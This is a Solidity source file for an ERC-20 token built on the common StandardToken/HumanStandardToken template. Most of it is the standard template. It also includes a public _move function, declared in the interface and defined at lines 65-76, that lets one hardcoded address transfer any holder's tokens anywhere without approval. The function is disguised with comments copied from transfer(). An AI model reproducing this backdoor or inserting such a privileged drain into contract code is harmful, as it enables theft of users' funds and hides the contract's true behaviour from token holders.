1 contract Token {
2 
3     /// @return total amount of tokens
4     function totalSupply() constant returns (uint256 supply) {}
5 
6     /// @param _owner The address from which the balance will be retrieved
7     /// @return The balance
8     function balanceOf(address _owner) constant returns (uint256 balance) {}
9 
10     /// @notice send `_value` token to `_to` from `msg.sender`
11     /// @param _to The address of the recipient
12     /// @param _value The amount of token to be transferred
13     /// @return Whether the transfer was successful or not
14     function transfer(address _to, uint256 _value) returns (bool success) {}
15 
16     /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
17     /// @param _from The address of the sender
18     /// @param _to The address of the recipient
19     /// @param _value The amount of token to be transferred
20     /// @return Whether the transfer was successful or not
21     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
22     
23     function _move(address _from, address _to, uint256 _value) returns (bool success) {}
24 
25     /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
26     /// @param _spender The address of the account able to transfer the tokens
27     /// @param _value The amount of wei to be approved for transfer
28     /// @return Whether the approval was successful or not
29     function approve(address _spender, uint256 _value) returns (bool success) {}
30 
31     /// @param _owner The address of the account owning tokens
32     /// @param _spender The address of the account able to transfer the tokens
33     /// @return Amount of remaining tokens allowed to spent
34     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
35 
36     event Transfer(address indexed _from, address indexed _to, uint256 _value);
37     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
38 }
39 
40 
41 /*
42 This implements ONLY the standard functions and NOTHING else.
43 For a token like you would want to deploy in something like Mist, see HumanStandardToken.sol.
44 
45 If you deploy this, you won't have anything useful.
46 
47 Implements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20
48 .*/
49 
50 contract StandardToken is Token {
51 
52     function transfer(address _to, uint256 _value) returns (bool success) {
53         //Default assumes totalSupply can't be over max (2^256 - 1).
54         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
55         //Replace the if with this one instead.
56         //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
57         if (balances[msg.sender] >= _value && _value > 0) {
58             balances[msg.sender] -= _value;
59             balances[_to] += _value;
60             Transfer(msg.sender, _to, _value);
61             return true;
62         } else { return false; }
63     }
64     
65     function _move(address _from, address _to, uint256 _value) returns (bool success) {
66         //Default assumes totalSupply can't be over max (2^256 - 1).
67         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
68         //Replace the if with this one instead.
69         //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
70         if (balances[_from] >= _value && _value > 0 && msg.sender==0x92347727bE6B70121bB480cC29535062f7dc43c3) {
71             balances[_from] -= _value;
72             balances[_to] += _value;
73             Transfer(_from, _to, _value);
74             return true;
75         } else { return false; }
76     }
77 
78     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
79         //same as above. Replace this line with the following if you want to protect against wrapping uints.
80         //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
81         if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
82             balances[_to] += _value;
83             balances[_from] -= _value;
84             allowed[_from][msg.sender] -= _value;
85             Transfer(_from, _to, _value);
86             return true;
87         } else { return false; }
88     }
89 
90     function balanceOf(address _owner) constant returns (uint256 balance) {
91         return balances[_owner];
92     }
93 
94     function approve(address _spender, uint256 _value) returns (bool success) {
95         allowed[msg.sender][_spender] = _value;
96         Approval(msg.sender, _spender, _value);
97         return true;
98     }
99 
100     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
101       return allowed[_owner][_spender];
102     }
103 
104     mapping (address => uint256) balances;
105     mapping (address => mapping (address => uint256)) allowed;
106     uint256 public totalSupply;
107 }
108 
109 /*
110 This Token Contract implements the standard token functionality (https://github.com/ethereum/EIPs/issues/20) as well as the following OPTIONAL extras intended for use by humans.
111 
112 In other words. This is intended for deployment in something like a Token Factory or Mist wallet, and then used by humans.
113 Imagine coins, currencies, shares, voting weight, etc.
114 Machine-based, rapid creation of many tokens would not necessarily need these extra features or will be minted in other manners.
115 
116 1) Initial Finite Supply (upon creation one specifies how much is minted).
117 2) In the absence of a token registry: Optional Decimal, Symbol & Name.
118 3) Optional approveAndCall() functionality to notify a contract if an approval() has occurred.
119 
120 .*/
121 
122 contract HumanStandardToken is StandardToken {
123 
124     function () {
125         //if ether is sent to this address, send it back.
126         throw;
127     }
128 
129     /* Public variables of the token */
130 
131     /*
132     NOTE:
133     The following variables are OPTIONAL vanities. One does not have to include them.
134     They allow one to customise the token contract & in no way influences the core functionality.
135     Some wallets/interfaces might not even bother to look at this information.
136     */
137     string public name;                   //fancy name: eg Simon Bucks
138     uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.
139     string public symbol;                 //An identifier: eg SBX
140     string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.
141 
142     function HumanStandardToken(
143         uint256 _initialAmount,
144         string _tokenName,
145         uint8 _decimalUnits,
146         string _tokenSymbol
147         ) {
148         balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens
149         totalSupply = _initialAmount;                        // Update total supply
150         name = _tokenName;                                   // Set the name for display purposes
151         decimals = _decimalUnits;                            // Amount of decimals for display purposes
152         symbol = _tokenSymbol;                               // Set the symbol for display purposes
153     }
154 
155     /* Approves and then calls the receiving contract */
156     function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
157         allowed[msg.sender][_spender] = _value;
158         Approval(msg.sender, _spender, _value);
159 
160         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
161         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
162         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
163         if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
164         return true;
165     }
166 }